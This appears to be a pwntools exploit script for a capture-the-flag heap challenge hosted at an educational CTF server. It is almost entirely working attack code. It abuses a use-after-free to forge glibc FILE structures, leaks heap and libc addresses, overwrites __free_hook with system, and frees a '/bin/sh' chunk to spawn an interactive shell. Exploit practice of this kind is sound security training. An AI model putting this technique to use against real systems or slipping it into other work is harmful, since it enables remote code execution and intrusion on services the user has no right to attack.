#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./chal', aslr=False)
r = remote('edu-ctf.zoolab.org', 10011)
# r = process('./chal', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"}, aslr=False)

"""
flags: 0x0
_IO_read_ptr: 0x0
_IO_read_end: 0x0
_IO_read_base: 0x0

_IO_write_base: 0x0
_IO_write_ptr: 0x0
_IO_write_end: 0x0

_IO_buf_base: 0x0
_IO_buf_end: 0x0

_IO_save_base: 0x0
_IO_backup_base: 0x0
_IO_save_end: 0x0

markers: 0x0
chain: 0x0


fileno: 0x0
_flags2: 0x0
_old_offset: 0xffffffffffffffff
_cur_column: 0x0
_vtable_offset: 0x0
_shortbuf: 0x0
unknown1: 0x0
_lock: 0xdeadbeef
_offset: 0xffffffffffffffff
_codecvt: 0x0
_wide_data: 0xdeadbeef
unknown2: 0x0
vtable: 0x0
"""
users_addr = 0x4040c0

def add(idx, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(idx))
    r.sendafter('> ', name)

def edit(idx, sz, data):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))
    r.sendlineafter('> ', str(sz))
    r.send(data)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', str(idx))

def show():
    r.sendlineafter('> ', '4')

fake_FILE = flat(
    0xfbad0800, # flags
    0, 1, 0, # _IO_read
    1, 1, 0, # _IO_write
    0, 0, # _IO_buf_*
    0, 0, 0, # _IO_ other
    0, 0, # markers, chain
    1, # fileno
)

add(0, "A")
edit(0, 0x100, b"AAAA")
delete(0)
edit(0, 0x1d8, fake_FILE)

r.recv(0x88)
heap = u64(r.recv(8)) - 0x3b0
r.recv(0x48)
libc = u64(r.recv(8)) - 0x1e94a0
system = libc + 0x52290
__free_hook = libc + 0x1eee48

info(f"libc: {hex(libc)}")
info(f"heap: {hex(heap)}")

fake_FILE2 = flat(
    0xfbad0008, # flags
    0, 0, 0, # _IO_read
    __free_hook, 0, 0, # _IO_write
    __free_hook, __free_hook + 0x208, # _IO_buf_*
    0, 0, 0, # _IO_ other
    0, 0, # markers, chain
    0, # fileno
)

add(1, "/bin/sh\x00")

add(2, "B")
edit(2, 0x100, b"BBBB")
delete(2)
edit(2, 0x1d8, fake_FILE2)
show()
r.send(p64(system).ljust(512, b'\x00') + b'\n')
delete(1)
r.interactive()
